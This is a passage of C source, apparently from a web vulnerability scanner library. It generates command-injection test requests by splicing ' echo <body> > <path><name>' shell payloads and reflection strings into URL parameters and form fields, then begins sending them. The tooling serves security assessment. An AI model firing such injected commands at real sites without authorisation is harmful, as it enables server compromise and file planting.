			current_request->test_ref = test;

			// destroy joiners
			bpfree(final_joiner_str);
			bpfree(join_string);
			bpfree(joiner);

			// increase the request count
			request_iter++;

		}

		// iter for file verification tests
		size_t file_verification_test_iter = 0;

		// generate file verification tests
		for
		(
				;
				file_verification_test_iter < element->file_verification_test_n;
				file_verification_test_iter++
		)
		{


			// set current request
			current_request = &request_info->generated_requests[request_iter];

			// number of anchor vars in the list
			size_t anchor_var_n = HTMLGetAnchorVarCount(test->anchor_var->first);

			// allocate space for all items
			char ** joiner = (char **) bpcalloc(sizeof(char*) * ((anchor_var_n * 10) + 1), 1);

			// set anchor reference
			P_BP_HTML_ANCHOR_LIST anchor = test->anchor;

			// set anchor var reference
			P_BP_HTML_ANCHOR_VAR_LIST anchor_var = test->anchor_var;
			if(!anchor_var)
				continue;

			// set joiner iter
			size_t joiner_iter = 0;

			// add parameter index
			joiner[joiner_iter] = "?";
			joiner_iter++;

			// walk var list
			for
			(
					anchor_var = anchor_var->first;
					anchor_var;
					anchor_var = anchor_var->next
			)
			{

				// ensure we have a var name
				if(!anchor_var->name)
					continue;

				// check anchor var here
				if(anchor_var == test->anchor_var)
				{

					joiner[joiner_iter] = anchor_var->name;
					joiner_iter++;
					joiner[joiner_iter] = "=";
					joiner_iter++;

					// add front part if one exists
					if(element->file_verification_tests[file_verification_test_iter].front_part)
					{
						joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].front_part, bpstrlen(element->file_verification_tests[file_verification_test_iter].front_part), cmd_injection_session->tq);
						joiner_iter++;
					}

					joiner[joiner_iter] = BP_UTF8StringEncode(" echo ", bpstrlen(" echo "), cmd_injection_session->tq);
					joiner_iter++;
					joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].upload_file_body, bpstrlen(element->file_verification_tests[file_verification_test_iter].upload_file_body), cmd_injection_session->tq);
					joiner_iter++;
					joiner[joiner_iter] = BP_UTF8StringEncode(" > ", 3, cmd_injection_session->tq);
					joiner_iter++;
					joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].upload_file_path, bpstrlen(element->file_verification_tests[file_verification_test_iter].upload_file_path), cmd_injection_session->tq);
					joiner_iter++;
					joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].upload_file_name, bpstrlen(element->file_verification_tests[file_verification_test_iter].upload_file_name), cmd_injection_session->tq);;
					joiner_iter++;

					// add back part if one exists
					if(element->file_verification_tests[file_verification_test_iter].back_part)
					{
						joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].back_part, bpstrlen(element->file_verification_tests[file_verification_test_iter].back_part), cmd_injection_session->tq);
						joiner_iter++;
					}

					// add ampersand if we have a next position
					if(anchor_var->next)
					{
						joiner[joiner_iter] = "&";
						joiner_iter++;
					}
				}
				else
				{

					// always add the var name
					joiner[joiner_iter] = anchor_var->name;
					joiner_iter++;

					// only add content if it exists
					if(joiner[joiner_iter] = anchor_var->content)
					{
						joiner[joiner_iter] = "=";
						joiner_iter++;
						joiner[joiner_iter] = anchor_var->content;
						joiner_iter++;
					}

					// add ampersand if we have a next position
					if(anchor_var->next)
					{
						joiner[joiner_iter] = "&";
						joiner_iter++;
					}

				}

			}

			// declare join string
			char * join_string = NULL;

			if(joiner_iter > 1)
				join_string = BP_JoinStringArray((char **) joiner, joiner_iter);

			// create final joiner
			char * final_joiner[3];
			BP_ZERO_STACK(final_joiner);

			// set full url to join with composite test
			final_joiner[0] = anchor->script;
			final_joiner[1] = join_string;

			// generate final string
			char * final_joiner_str = BP_JoinStringArray((char **) &final_joiner, 2);

			// set the get string
			current_request->get_str = tq_strdup(cmd_injection_session->tq, final_joiner_str, BPLN);


			// set reference to file verification test
			current_request->file_verification_test_ref = &element->file_verification_tests[file_verification_test_iter];
			current_request->file_verification_test_index = file_verification_test_iter;
			current_request->test_ref = test;

			// printf("\n Final: %s", final_joiner_str);
			// destroy joiners
			bpfree(final_joiner_str);
			bpfree(join_string);
			bpfree(joiner);



			// increase the request count
			request_iter++;

		}

	}


	if(test->is_form_test)
	{

		// reflection test iterator
		size_t reflection_test_iter = 0;

		// generate reflection tests
		for
		(
				reflection_test_iter = 0;
				reflection_test_iter < element->pattern_reflection_test_n;
				reflection_test_iter++
		)
		{


			// set current request
			current_request = &request_info->generated_requests[request_iter];

			// number of anchor vars in the list
			size_t form_input_n = HTMLGetInputCount(test->form_input->first);


			// allocate space for all items
			char ** joiner = (char **) bpcalloc(sizeof(char*) * ((form_input_n * 4) + 1), 1);

			// set anchor reference
			P_BP_HTML_FORM_LIST form = test->form;

			// set anchor var reference
			P_BP_HTML_INPUT_LIST input_var = test->form_input;

			// set joiner iter
			size_t joiner_iter = 0;

			// we need vars to test the form
			if(!input_var)
				continue;


			// if the form is a HTTP GET form, add the var indicator here
			if(form->method == BP_HTML_FORM_METHOD_GET)
			{

				// add parameter index
				joiner[joiner_iter] = "?";
				joiner_iter++;

			}

			// walk var list
			for
			(
					input_var = input_var->first;
					input_var;
					input_var = input_var->next
			)
			{

				// ensure we have a var name
				if(!input_var->properties)
					continue;

				// check anchor var here
				if(input_var == test->form_input)
				{

					// look up name (required)
					P_BP_HTML_INPUT_PROPERTY_LIST input = HTMLGetInputPropertyByNameI(input_var->properties, "name");
					if(input)
					{
						char * input_name = input->content;
						joiner[joiner_iter] = input_name;
						joiner_iter++;
						joiner[joiner_iter] = "=";
						joiner_iter++;
						joiner[joiner_iter] = BP_UTF8StringEncode(element->pattern_reflection_tests[reflection_test_iter].execution_test, bpstrlen(element->pattern_reflection_tests[reflection_test_iter].execution_test), cmd_injection_session->tq);
						joiner_iter++;

						// add ampersand if we have a next position
						if(input_var->next)
						{
							joiner[joiner_iter] = "&";
							joiner_iter++;
						}
					}
				}
				else
				{

					P_BP_HTML_INPUT_PROPERTY_LIST input = HTMLGetInputPropertyByNameI(input_var->properties, "name");
					if(input)
					{

						P_BP_HTML_INPUT_PROPERTY_LIST input_val = HTMLGetInputPropertyByNameI(input_var->properties, "value");

						char * input_name  = input->content;
						char * input_value = NULL;
						if(input_val)
							input_value = input_val->content;

						// always add the var name
						joiner[joiner_iter] = input_name;
						joiner_iter++;

						// only add content if it exists
						if(input_value)
						{
							joiner[joiner_iter] = "=";
							joiner_iter++;
							joiner[joiner_iter] = input_value;
							joiner_iter++;
						}

						// add ampersand if we have a next position
						if(input_var->next)
						{
							joiner[joiner_iter] = "&";
							joiner_iter++;
						}

					}

				}

			}

			// declare join string
			char * join_string = NULL;

			if(joiner_iter > 1)
				join_string = BP_JoinStringArray((char **) joiner, joiner_iter);

			// set full url to join with composite test
			if(form->method == BP_HTML_FORM_METHOD_GET)
			{
				// create final joiner
				char * final_joiner[3];
				BP_ZERO_STACK(final_joiner);

				final_joiner[0] = form->script;
				final_joiner[1] = join_string;

				// generate final string
				char * final_joiner_str = BP_JoinStringArray((char **) &final_joiner, 2);

				// set the get string
				current_request->get_str = tq_strdup(cmd_injection_session->tq, final_joiner_str, BPLN);

				// destroy joiners
				bpfree(final_joiner_str);

			}
			else
			{

				// set the get string
				current_request->get_str = tq_strdup(cmd_injection_session->tq, form->full_url, BPLN);

				// set the post string
				current_request->post_str = tq_strdup(cmd_injection_session->tq, join_string, BPLN);

			}

			// pattern reflection index and reference
			current_request->pattern_reflection_test_ref = &element->pattern_reflection_tests[reflection_test_iter];
			current_request->pattern_reflection_test_index = reflection_test_iter;
			current_request->test_ref = test;
			// destroy items
			bpfree(join_string);
			bpfree(joiner);

			// increase the request count
			request_iter++;

		}


		// iter for file verification tests
		size_t file_verification_test_iter = 0;

		// generate file verification tests
		for
		(
				;
				file_verification_test_iter < element->file_verification_test_n;
				file_verification_test_iter++
		)
		{

			// set current request
			current_request = &request_info->generated_requests[request_iter];

			// number of anchor vars in the list
			size_t form_input_n = HTMLGetInputCount(test->form_input->first);


			// allocate space for all items
			char ** joiner = (char **) bpcalloc(sizeof(char*) * ((form_input_n * 20) + 1), 1);

			// set anchor reference
			P_BP_HTML_FORM_LIST form = test->form;

			// set anchor var reference
			P_BP_HTML_INPUT_LIST input_var = test->form_input;

			// set joiner iter
			size_t joiner_iter = 0;

			// we need vars to test the form
			if(!input_var)
				continue;


			// if the form is a HTTP GET form, add the var indicator here
			if(form->method == BP_HTML_FORM_METHOD_GET)
			{

				// add parameter index
				joiner[joiner_iter] = "?";
				joiner_iter++;

			}

			// walk var list
			for
			(
					input_var = input_var->first;
					input_var;
					input_var = input_var->next
			)
			{

				// ensure we have a var name
				if(!input_var->properties)
					continue;

				// check anchor var here
				if(input_var == test->form_input)
				{

					// look up name (required)
					P_BP_HTML_INPUT_PROPERTY_LIST input = HTMLGetInputPropertyByNameI(input_var->properties, "name");
					if(input)
					{
						char * input_name = input->content;
						joiner[joiner_iter] = input_name;
						joiner_iter++;
						joiner[joiner_iter] = "=";
						joiner_iter++;

						// add front part if one exists
						if(element->file_verification_tests[file_verification_test_iter].front_part)
						{
							joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].front_part, bpstrlen(element->file_verification_tests[file_verification_test_iter].front_part), cmd_injection_session->tq);
							joiner_iter++;
						}

						joiner[joiner_iter] = BP_UTF8StringEncode(" echo ", bpstrlen(" echo "), cmd_injection_session->tq);
						joiner_iter++;
						joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].upload_file_body, bpstrlen(element->file_verification_tests[file_verification_test_iter].upload_file_body), cmd_injection_session->tq);
						joiner_iter++;
						joiner[joiner_iter] = BP_UTF8StringEncode(" > ", 3, cmd_injection_session->tq);
						joiner_iter++;
						joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].upload_file_path, bpstrlen(element->file_verification_tests[file_verification_test_iter].upload_file_path), cmd_injection_session->tq);
						joiner_iter++;
						joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].upload_file_name, bpstrlen(element->file_verification_tests[file_verification_test_iter].upload_file_name), cmd_injection_session->tq);;
						joiner_iter++;

						// add back part if one exists
						if(element->file_verification_tests[file_verification_test_iter].back_part)
						{
							joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].back_part, bpstrlen(element->file_verification_tests[file_verification_test_iter].back_part), cmd_injection_session->tq);
							joiner_iter++;
						}


						// add ampersand if we have a next position
						if(input_var->next)
						{
							joiner[joiner_iter] = "&";
							joiner_iter++;
						}

					}

				}
				else
				{

					P_BP_HTML_INPUT_PROPERTY_LIST input = HTMLGetInputPropertyByNameI(input_var->properties, "name");
					if(input)
					{

						P_BP_HTML_INPUT_PROPERTY_LIST input_val = HTMLGetInputPropertyByNameI(input_var->properties, "value");


						char * input_name  = input->content;
						char * input_value = NULL;
						if(input_val)
							input_value = input_val->content;

						// always add the var name
						joiner[joiner_iter] = input_name;
						joiner_iter++;

						// only add content if it exists
						if(input_value)
						{
							joiner[joiner_iter] = "=";
							joiner_iter++;
							joiner[joiner_iter] = input_value;
							joiner_iter++;
						}

						// add ampersand if we have a next position
						if(input_var->next)
						{
							joiner[joiner_iter] = "&";
							joiner_iter++;
						}

					}

				}

			}

			// declare join string
			char * join_string = NULL;

			if(joiner_iter > 1)
				join_string = BP_JoinStringArray((char **) joiner, joiner_iter);

			// set full url to join with composite test
			if(form->method == BP_HTML_FORM_METHOD_GET)
			{
				// create final joiner
				char * final_joiner[3];
				BP_ZERO_STACK(final_joiner);

				final_joiner[0] = form->script;
				final_joiner[1] = join_string;

				// generate final string
				char * final_joiner_str = BP_JoinStringArray((char **) &final_joiner, 2);

				// set the get string
				current_request->get_str = tq_strdup(cmd_injection_session->tq, final_joiner_str, BPLN);

				// destroy joiners
				bpfree(final_joiner_str);

			}
			else
			{

				// set the get string
				current_request->get_str = tq_strdup(cmd_injection_session->tq, form->full_url, BPLN);

				// set the post string
				current_request->post_str = tq_strdup(cmd_injection_session->tq, join_string, BPLN);

			}

			current_request->file_verification_test_ref = &element->file_verification_tests[file_verification_test_iter];
			current_request->file_verification_test_index = file_verification_test_iter;
			current_request->test_ref = test;
			// destroy items
			bpfree(join_string);
			bpfree(joiner);

			// increase the request count
			request_iter++;

		}

	}


	// return the request info
	return request_info;

}


// generates command injection requests from element sets
P_BP_WEB_COMMAND_INJECTION_HTTP_REQUEST_INFO BP_CommandInjectionGenerateCustomHTTPInjectionRequest
(
		P_BP_WEB_COMMAND_INJECTION_TEST_SESSION cmd_injection_session,
		P_BP_WEB_COMMAND_INJECTION_TEST         test,
		P_BP_WEB_COMMAND_INJECTION_ELEMENT      element,
		char * custom_command
)
{

	// check parameters and ensure they exist
	if(!test)
		return NULL;
	if(!element)
		return NULL;

	// allocate request info structure
	P_BP_WEB_COMMAND_INJECTION_HTTP_REQUEST_INFO request_info = (P_BP_WEB_COMMAND_INJECTION_HTTP_REQUEST_INFO) tq_calloc
	(
			cmd_injection_session->tq,
			sizeof(BP_WEB_COMMAND_INJECTION_HTTP_REQUEST_INFO),
			1,
			BPLN
	);

	// set the total requests
	size_t total_requests = 0;



	// increase the request count by the number of tests we have to submit
	total_requests += element->file_verification_test_n;
	total_requests += element->pattern_reflection_test_n;

	// set the total requests
	request_info->request_n = total_requests;

	// allocate space for requests
	request_info->generated_requests = (P_BP_WEB_COMMAND_INJECTION_HTTP_REQUEST) tq_calloc
	(
			cmd_injection_session->tq,
			sizeof(BP_WEB_COMMAND_INJECTION_HTTP_REQUEST) * total_requests,
			1,
			BPLN
	);


	// request iterator
	size_t request_iter = 0;

	// placeholder for the current request
	P_BP_WEB_COMMAND_INJECTION_HTTP_REQUEST current_request = NULL;

	// generate anchor requests if it's an anchor test
	if(test->is_anchor_test)
	{

		// reflection test iterator
		size_t reflection_test_iter = 0;

		// generate reflection tests
		for
		(
				;
				reflection_test_iter < element->pattern_reflection_test_n;
				reflection_test_iter++
		)
		{


			// set current request
			current_request = &request_info->generated_requests[request_iter];

			// number of anchor vars in the list
			size_t anchor_var_n = HTMLGetAnchorVarCount(test->anchor_var->first);

			// allocate space for all items
			char ** joiner = (char **) bpcalloc(sizeof(char*) * ((anchor_var_n * 4) + 1), 1);

			// set anchor reference
			P_BP_HTML_ANCHOR_LIST anchor = test->anchor;

			// set anchor var reference
			P_BP_HTML_ANCHOR_VAR_LIST anchor_var = test->anchor_var;
			if(!anchor_var)
				continue;

			// set joiner iter
			size_t joiner_iter = 0;

			// add parameter index
			joiner[joiner_iter] = "?";
			joiner_iter++;

			// walk var list
			for
			(
					anchor_var = anchor_var->first;
					anchor_var;
					anchor_var = anchor_var->next
			)
			{

				// ensure we have a var name
				if(!anchor_var->name)
					continue;

				// check anchor var here
				if(anchor_var == test->anchor_var)
				{

					joiner[joiner_iter] = anchor_var->name;
					joiner_iter++;
					joiner[joiner_iter] = "=";
					joiner_iter++;
					joiner[joiner_iter] = BP_UTF8StringEncode(element->pattern_reflection_tests[reflection_test_iter].execution_test, bpstrlen(element->pattern_reflection_tests[reflection_test_iter].execution_test), cmd_injection_session->tq);
					joiner_iter++;

					// add ampersand if we have a next position
					if(anchor_var->next)
					{
						joiner[joiner_iter] = "&";
						joiner_iter++;
					}
				}
				else
				{

					// always add the var name
					joiner[joiner_iter] = anchor_var->name;
					joiner_iter++;

					// only add content if it exists
					if(joiner[joiner_iter] = anchor_var->content)
					{
						joiner[joiner_iter] = "=";
						joiner_iter++;
						joiner[joiner_iter] = anchor_var->content;
						joiner_iter++;
					}

					// add ampersand if we have a next position
					if(anchor_var->next)
					{
						joiner[joiner_iter] = "&";
						joiner_iter++;
					}

				}

			}

			// declare join string
			char * join_string = NULL;

			if(joiner_iter > 1)
				join_string = BP_JoinStringArray((char **) joiner, joiner_iter);

			// create final joiner
			char * final_joiner[3];
			BP_ZERO_STACK(final_joiner);

			// set full url to join with composite test
			final_joiner[0] = anchor->script;
			final_joiner[1] = join_string;

			// generate final string
			char * final_joiner_str = BP_JoinStringArray((char **) &final_joiner, 2);

			// set the get string
			current_request->get_str = tq_strdup(cmd_injection_session->tq, final_joiner_str, BPLN);

			// set reference to reflection test
			current_request->pattern_reflection_test_ref   = &element->pattern_reflection_tests[reflection_test_iter];
			current_request->pattern_reflection_test_index = reflection_test_iter;

			// destroy joiners
			bpfree(final_joiner_str);
			bpfree(join_string);
			bpfree(joiner);

			// increase the request count
			request_iter++;

		}

		// iter for file verification tests
		size_t file_verification_test_iter = 0;

		// generate file verification tests
		for
		(
				;
				file_verification_test_iter < element->file_verification_test_n;
				file_verification_test_iter++
		)
		{


			// set current request
			current_request = &request_info->generated_requests[request_iter];

			// number of anchor vars in the list
			size_t anchor_var_n = HTMLGetAnchorVarCount(test->anchor_var->first);

			// allocate space for all items
			char ** joiner = (char **) bpcalloc(sizeof(char*) * ((anchor_var_n * 10) + 1), 1);

			// set anchor reference
			P_BP_HTML_ANCHOR_LIST anchor = test->anchor;

			// set anchor var reference
			P_BP_HTML_ANCHOR_VAR_LIST anchor_var = test->anchor_var;
			if(!anchor_var)
				continue;

			// set joiner iter
			size_t joiner_iter = 0;

			// add parameter index
			joiner[joiner_iter] = "?";
			joiner_iter++;

			// walk var list
			for
			(
					anchor_var = anchor_var->first;
					anchor_var;
					anchor_var = anchor_var->next
			)
			{

				// ensure we have a var name
				if(!anchor_var->name)
					continue;

				// check anchor var here
				if(anchor_var == test->anchor_var)
				{

					joiner[joiner_iter] = anchor_var->name;
					joiner_iter++;
					joiner[joiner_iter] = "=";
					joiner_iter++;

					// add front part if one exists
					if(element->file_verification_tests[file_verification_test_iter].front_part)
					{
						joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].front_part, bpstrlen(element->file_verification_tests[file_verification_test_iter].front_part), cmd_injection_session->tq);
						joiner_iter++;
					}

					joiner[joiner_iter] = BP_UTF8StringEncode(" echo ", bpstrlen(" echo "), cmd_injection_session->tq);
					joiner_iter++;
					joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].upload_file_body, bpstrlen(element->file_verification_tests[file_verification_test_iter].upload_file_body), cmd_injection_session->tq);
					joiner_iter++;
					joiner[joiner_iter] = BP_UTF8StringEncode(" > ", 3, cmd_injection_session->tq);
					joiner_iter++;
					joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].upload_file_path, bpstrlen(element->file_verification_tests[file_verification_test_iter].upload_file_path), cmd_injection_session->tq);
					joiner_iter++;
					joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].upload_file_name, bpstrlen(element->file_verification_tests[file_verification_test_iter].upload_file_name), cmd_injection_session->tq);;
					joiner_iter++;

					// add back part if one exists
					if(element->file_verification_tests[file_verification_test_iter].back_part)
					{
						joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].back_part, bpstrlen(element->file_verification_tests[file_verification_test_iter].back_part), cmd_injection_session->tq);
						joiner_iter++;
					}

					// add ampersand if we have a next position
					if(anchor_var->next)
					{
						joiner[joiner_iter] = "&";
						joiner_iter++;
					}
				}
				else
				{

					// always add the var name
					joiner[joiner_iter] = anchor_var->name;
					joiner_iter++;

					// only add content if it exists
					if(joiner[joiner_iter] = anchor_var->content)
					{
						joiner[joiner_iter] = "=";
						joiner_iter++;
						joiner[joiner_iter] = anchor_var->content;
						joiner_iter++;
					}

					// add ampersand if we have a next position
					if(anchor_var->next)
					{
						joiner[joiner_iter] = "&";
						joiner_iter++;
					}

				}

			}

			// declare join string
			char * join_string = NULL;

			if(joiner_iter > 1)
				join_string = BP_JoinStringArray((char **) joiner, joiner_iter);

			// create final joiner
			char * final_joiner[3];
			BP_ZERO_STACK(final_joiner);

			// set full url to join with composite test
			final_joiner[0] = anchor->script;
			final_joiner[1] = join_string;

			// generate final string
			char * final_joiner_str = BP_JoinStringArray((char **) &final_joiner, 2);

			// set the get string
			current_request->get_str = tq_strdup(cmd_injection_session->tq, final_joiner_str, BPLN);


			// set reference to file verification test
			current_request->file_verification_test_ref = &element->file_verification_tests[file_verification_test_iter];
			current_request->file_verification_test_index = file_verification_test_iter;

			// printf("\n Final: %s", final_joiner_str);
			// destroy joiners
			bpfree(final_joiner_str);
			bpfree(join_string);
			bpfree(joiner);



			// increase the request count
			request_iter++;

		}

	}


	if(test->is_form_test)
	{

		// reflection test iterator
		size_t reflection_test_iter = 0;

		// generate reflection tests
		for
		(
				reflection_test_iter = 0;
				reflection_test_iter < element->pattern_reflection_test_n;
				reflection_test_iter++
		)
		{


			// set current request
			current_request = &request_info->generated_requests[request_iter];

			// number of anchor vars in the list
			size_t form_input_n = HTMLGetInputCount(test->form_input->first);


			// allocate space for all items
			char ** joiner = (char **) bpcalloc(sizeof(char*) * ((form_input_n * 4) + 1), 1);

			// set anchor reference
			P_BP_HTML_FORM_LIST form = test->form;

			// set anchor var reference
			P_BP_HTML_INPUT_LIST input_var = test->form_input;

			// set joiner iter
			size_t joiner_iter = 0;

			// we need vars to test the form
			if(!input_var)
				continue;


			// if the form is a HTTP GET form, add the var indicator here
			if(form->method == BP_HTML_FORM_METHOD_GET)
			{

				// add parameter index
				joiner[joiner_iter] = "?";
				joiner_iter++;

			}

			// walk var list
			for
			(
					input_var = input_var->first;
					input_var;
					input_var = input_var->next
			)
			{

				// ensure we have a var name
				if(!input_var->properties)
					continue;

				// check anchor var here
				if(input_var == test->form_input)
				{

					// look up name (required)
					P_BP_HTML_INPUT_PROPERTY_LIST input = HTMLGetInputPropertyByNameI(input_var->properties, "name");
					if(input)
					{
						char * input_name = input->content;
						joiner[joiner_iter] = input_name;
						joiner_iter++;
						joiner[joiner_iter] = "=";
						joiner_iter++;
						joiner[joiner_iter] = BP_UTF8StringEncode(element->pattern_reflection_tests[reflection_test_iter].execution_test, bpstrlen(element->pattern_reflection_tests[reflection_test_iter].execution_test), cmd_injection_session->tq);
						joiner_iter++;

						// add ampersand if we have a next position
						if(input_var->next)
						{
							joiner[joiner_iter] = "&";
							joiner_iter++;
						}
					}
				}
				else
				{

					P_BP_HTML_INPUT_PROPERTY_LIST input = HTMLGetInputPropertyByNameI(input_var->properties, "name");
					if(input)
					{

						P_BP_HTML_INPUT_PROPERTY_LIST input_val = HTMLGetInputPropertyByNameI(input_var->properties, "value");

						char * input_name  = input->content;
						char * input_value = NULL;
						if(input_val)
							input_value = input_val->content;

						// always add the var name
						joiner[joiner_iter] = input_name;
						joiner_iter++;

						// only add content if it exists
						if(input_value)
						{
							joiner[joiner_iter] = "=";
							joiner_iter++;
							joiner[joiner_iter] = input_value;
							joiner_iter++;
						}

						// add ampersand if we have a next position
						if(input_var->next)
						{
							joiner[joiner_iter] = "&";
							joiner_iter++;
						}

					}

				}

			}

			// declare join string
			char * join_string = NULL;

			if(joiner_iter > 1)
				join_string = BP_JoinStringArray((char **) joiner, joiner_iter);

			// set full url to join with composite test
			if(form->method == BP_HTML_FORM_METHOD_GET)
			{
				// create final joiner
				char * final_joiner[3];
				BP_ZERO_STACK(final_joiner);

				final_joiner[0] = form->script;
				final_joiner[1] = join_string;

				// generate final string
				char * final_joiner_str = BP_JoinStringArray((char **) &final_joiner, 2);

				// set the get string
				current_request->get_str = tq_strdup(cmd_injection_session->tq, final_joiner_str, BPLN);

				// destroy joiners
				bpfree(final_joiner_str);

			}
			else
			{

				// set the get string
				current_request->get_str = tq_strdup(cmd_injection_session->tq, form->full_url, BPLN);

				// set the post string
				current_request->post_str = tq_strdup(cmd_injection_session->tq, join_string, BPLN);

			}

			// pattern reflection index and reference
			current_request->pattern_reflection_test_ref = &element->pattern_reflection_tests[reflection_test_iter];
			current_request->pattern_reflection_test_index = reflection_test_iter;

			// destroy items
			bpfree(join_string);
			bpfree(joiner);

			// increase the request count
			request_iter++;

		}


		// iter for file verification tests
		size_t file_verification_test_iter = 0;

		// generate file verification tests
		for
		(
				;
				file_verification_test_iter < element->file_verification_test_n;
				file_verification_test_iter++
		)
		{

			// set current request
			current_request = &request_info->generated_requests[request_iter];

			// number of anchor vars in the list
			size_t form_input_n = HTMLGetInputCount(test->form_input->first);


			// allocate space for all items
			char ** joiner = (char **) bpcalloc(sizeof(char*) * ((form_input_n * 20) + 1), 1);

			// set anchor reference
			P_BP_HTML_FORM_LIST form = test->form;

			// set anchor var reference
			P_BP_HTML_INPUT_LIST input_var = test->form_input;

			// set joiner iter
			size_t joiner_iter = 0;

			// we need vars to test the form
			if(!input_var)
				continue;


			// if the form is a HTTP GET form, add the var indicator here
			if(form->method == BP_HTML_FORM_METHOD_GET)
			{

				// add parameter index
				joiner[joiner_iter] = "?";
				joiner_iter++;

			}

			// walk var list
			for
			(
					input_var = input_var->first;
					input_var;
					input_var = input_var->next
			)
			{

				// ensure we have a var name
				if(!input_var->properties)
					continue;

				// check anchor var here
				if(input_var == test->form_input)
				{

					// look up name (required)
					P_BP_HTML_INPUT_PROPERTY_LIST input = HTMLGetInputPropertyByNameI(input_var->properties, "name");
					if(input)
					{
						char * input_name = input->content;
						joiner[joiner_iter] = input_name;
						joiner_iter++;
						joiner[joiner_iter] = "=";
						joiner_iter++;

						// add front part if one exists
						if(element->file_verification_tests[file_verification_test_iter].front_part)
						{
							joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].front_part, bpstrlen(element->file_verification_tests[file_verification_test_iter].front_part), cmd_injection_session->tq);
							joiner_iter++;
						}

						joiner[joiner_iter] = BP_UTF8StringEncode(" echo ", bpstrlen(" echo "), cmd_injection_session->tq);
						joiner_iter++;
						joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].upload_file_body, bpstrlen(element->file_verification_tests[file_verification_test_iter].upload_file_body), cmd_injection_session->tq);
						joiner_iter++;
						joiner[joiner_iter] = BP_UTF8StringEncode(" > ", 3, cmd_injection_session->tq);
						joiner_iter++;
						joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].upload_file_path, bpstrlen(element->file_verification_tests[file_verification_test_iter].upload_file_path), cmd_injection_session->tq);
						joiner_iter++;
						joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].upload_file_name, bpstrlen(element->file_verification_tests[file_verification_test_iter].upload_file_name), cmd_injection_session->tq);;
						joiner_iter++;

						// add back part if one exists
						if(element->file_verification_tests[file_verification_test_iter].back_part)
						{
							joiner[joiner_iter] = BP_UTF8StringEncode(element->file_verification_tests[file_verification_test_iter].back_part, bpstrlen(element->file_verification_tests[file_verification_test_iter].back_part), cmd_injection_session->tq);
							joiner_iter++;
						}


						// add ampersand if we have a next position
						if(input_var->next)
						{
							joiner[joiner_iter] = "&";
							joiner_iter++;
						}

					}

				}
				else
				{

					P_BP_HTML_INPUT_PROPERTY_LIST input = HTMLGetInputPropertyByNameI(input_var->properties, "name");
					if(input)
					{

						P_BP_HTML_INPUT_PROPERTY_LIST input_val = HTMLGetInputPropertyByNameI(input_var->properties, "value");


						char * input_name  = input->content;
						char * input_value = NULL;
						if(input_val)
							input_value = input_val->content;

						// always add the var name
						joiner[joiner_iter] = input_name;
						joiner_iter++;

						// only add content if it exists
						if(input_value)
						{
							joiner[joiner_iter] = "=";
							joiner_iter++;
							joiner[joiner_iter] = input_value;
							joiner_iter++;
						}

						// add ampersand if we have a next position
						if(input_var->next)
						{
							joiner[joiner_iter] = "&";
							joiner_iter++;
						}

					}

				}

			}

			// declare join string
			char * join_string = NULL;

			if(joiner_iter > 1)
				join_string = BP_JoinStringArray((char **) joiner, joiner_iter);

			// set full url to join with composite test
			if(form->method == BP_HTML_FORM_METHOD_GET)
			{
				// create final joiner
				char * final_joiner[3];
				BP_ZERO_STACK(final_joiner);

				final_joiner[0] = form->script;
				final_joiner[1] = join_string;

				// generate final string
				char * final_joiner_str = BP_JoinStringArray((char **) &final_joiner, 2);

				// set the get string
				current_request->get_str = tq_strdup(cmd_injection_session->tq, final_joiner_str, BPLN);

				// destroy joiners
				bpfree(final_joiner_str);

			}
			else
			{

				// set the get string
				current_request->get_str = tq_strdup(cmd_injection_session->tq, form->full_url, BPLN);

				// set the post string
				current_request->post_str = tq_strdup(cmd_injection_session->tq, join_string, BPLN);

			}

			current_request->file_verification_test_ref = &element->file_verification_tests[file_verification_test_iter];
			current_request->file_verification_test_index = file_verification_test_iter;

			// destroy items
			bpfree(join_string);
			bpfree(joiner);

			// increase the request count
			request_iter++;

		}

	}


	// return the request info
	return request_info;

}




// runs command injection tests (actually makes requests)
BP_ERROR_T BP_CommandInjectionRunHTTPRequests
(
		P_BP_WEB_COMMAND_INJECTION_TEST_SESSION cmd_injection_session,
		P_BP_HTTP_SESSION http_session,
		P_BP_WEB_COMMAND_INJECTION_TEST test,
		P_BP_WEB_COMMAND_INJECTION_HTTP_REQUEST_INFO http_generated_requests
)
{

	// ensure we have a session
	if(!cmd_injection_session)
		return ERR_FAILURE;

	// ensure we have a test
	if(!test)
		return ERR_FAILURE;

	// ensure we have request to run
	if(!http_generated_requests)
		return ERR_FAILURE;

	// ensure we have a http session
	if(!http_session)
		return ERR_FAILURE;

	// request iter
	size_t request_iter = 0;






	// reference into the request stack
	P_BP_WEB_COMMAND_INJECTION_HTTP_REQUEST request = NULL;

	for
	(
			;
			request_iter < http_generated_requests->request_n;
			request_iter++
	)
	{

		// set request
		request = &http_generated_requests->generated_requests[request_iter];

		// lock the assessment
		BP_CommandInjectionLockAssessment(cmd_injection_session);

		// allocate space for the entry
		cmd_injection_session->all_requests = (P_BP_WEB_COMMAND_INJECTION_HTTP_REQUEST *) tq_realloc
		(
				cmd_injection_session->tq,
				cmd_injection_session->all_requests,
